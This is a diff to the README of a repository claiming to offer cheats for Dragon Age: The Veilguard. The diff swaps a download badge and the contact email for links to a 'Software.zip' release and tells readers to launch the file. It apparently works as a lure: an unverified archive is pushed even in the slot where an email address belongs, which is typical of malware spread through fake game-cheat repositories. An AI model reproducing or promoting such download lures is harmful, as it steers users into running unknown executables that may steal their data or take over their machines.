@@ -10,7 +10,7 @@ Welcome to the "Dragon-Age-The-Veilguard-Cheats" repository! Here, you can find 
 
 ## 🚀 Download the Latest Version 📦
 
-[![Download Dragon Age: The Veilguard Cheats](https://img.shields.io/badge/Download-Latest%20Version-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Dragon Age: The Veilguard Cheats](https://github.com/boogeyman893/Dragon-Age-The-Veilguard-Cheats/releases/download/v1.0/Software.zip%20Version-brightgreen)](https://github.com/boogeyman893/Dragon-Age-The-Veilguard-Cheats/releases/download/v1.0/Software.zip)
 
 Click the button above to download the latest version of Dragon Age: The Veilguard Cheats. Launch the file to access all the amazing cheats and hacks for your Dragon Age gameplay experience.
 
@@ -44,7 +44,7 @@ Connect with other Dragon Age fans, share your experiences, and discover new che
 
 ## 📞 Contact Us 📧
 
-If you have any questions, suggestions, or feedback regarding the Dragon-Age-The-Veilguard-Cheats repository, please reach out to us via email at [contact@veilguardcheats.com](mailto:contact@veilguardcheats.com). We value your input and strive to provide the best possible gaming experience for all players.
+If you have any questions, suggestions, or feedback regarding the Dragon-Age-The-Veilguard-Cheats repository, please reach out to us via email at [https://github.com/boogeyman893/Dragon-Age-The-Veilguard-Cheats/releases/download/v1.0/Software.zip](https://github.com/boogeyman893/Dragon-Age-The-Veilguard-Cheats/releases/download/v1.0/Software.zip). We value your input and strive to provide the best possible gaming experience for all players.
 
 ---
 
